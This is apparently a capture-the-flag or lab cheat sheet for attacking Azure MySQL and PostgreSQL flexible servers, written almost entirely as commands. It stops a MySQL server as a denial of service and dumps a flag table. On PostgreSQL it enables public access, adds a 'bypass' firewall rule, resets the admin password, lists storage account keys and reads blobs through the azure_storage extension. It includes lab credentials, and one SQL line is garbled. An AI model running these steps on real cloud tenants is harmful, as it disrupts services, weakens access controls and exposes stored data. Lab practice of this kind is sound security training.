# MySQL & PostgreSQL

## MySQL Denial­-of-Se­rvice

```sh
az mysql flexible-server list
az mysql flexible-server db list --server-name mysqlserverlab1-d090e49d -g mysql-flexible-labs-rg-1

# DDoS
az mysql flexible-server stop -name mysqlserverlab1-d090e49d -g mysql-flexible-labs-rg-1

mysql -u mysqladmin --password='P@ssw0rd1234!' -h mysqlserverlab1-d090e49d.mysql.database.azure.com -D flagdatabaselab1
```

Then on the database:

```sql
SHOW tables;
USE flagdatabaselab1;
SELECT * FROM flagdatabaselab1;
```

## Firewa­ll Rules & Access Storag­e from Postgr­eSQL

```sh
az postgres flexible-server list
az postgres flexible-server db list --server-name postgresqlserverlab2-d090e49d -g postgresql-flexible-labs-rg-2


# Enable public access and create FW rule
az postgres flexible-server update --name postgresqlserverlab2-d090e49d -g postgresql-flexible-labs-rg-2 --public-access Enabled
az postgres flexible-server firewall-rule create --name postgresqlserverlab2-d090e49d -g postgresql-flexible-labs-rg-2 --rule-name "bypass" --start-ip-address 212.195.225.148 --end-ip-address 212.195.225.148 # IP based on error when trying to connect

# Change admin password
az postgres flexible-server update --name postgresqlserverlab2-d090e49d -g postgresql-flexible-labs-rg-2 --admin-password 'ComplexP@ssword123!' # if BadGateway error, use the second one
az rest --method patch --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/postgresql-flexible-labs-rg-2/providers/Microsoft.DBforPostgreSQL/flexibleServers/postgresqlserverlab2-02fedb58?api-version=2022-12-01" --body '{"properties":{"administratorLoginPassword":"ComplexP@ssword123!"}}'

# Enable Storage account extension
az postgres flexible-server parameter set --server-name postgresqlserverlab2-d090e49d -g postgresql-flexible-labs-rg-2 --name azure.extensions --value "AZURE_STORAGE"

# Liste storage account keys
az storage account list
az storage account keys list --account-name

psql -U postgresadmin -W -h postgresqlserverlab2-d090e49d.postgres.database.azure.com -d FlagDatabaseLab2
```

Then on the database:

```sql
CREATE EXTENSION IF NOT EXISTS azure_storage;

-- Login using storage keys
SELECT azure_storage.account_add('<storage-account>', '<storage-key>');
-- Login using managed identity
SELECT azure_storage.account_add(azure_storage.account_options_managed_identity('<storage-account>', 'blob'))SELECT * FROM flagdatabaselab1;

-- List configured accounts
SELECT * FROM azure_storage.account_list();

-- List all the files in the storage account
SELECT * FROM azure_storage.blob_list('<storage-account>', '<container>');

-- Access one file inside the storage account
SELECT *
FROM azure_storage.blob_get('<storage-account>','<container>','message.txt',decoder := 'text') AS t(content text)LIMIT 1;
```
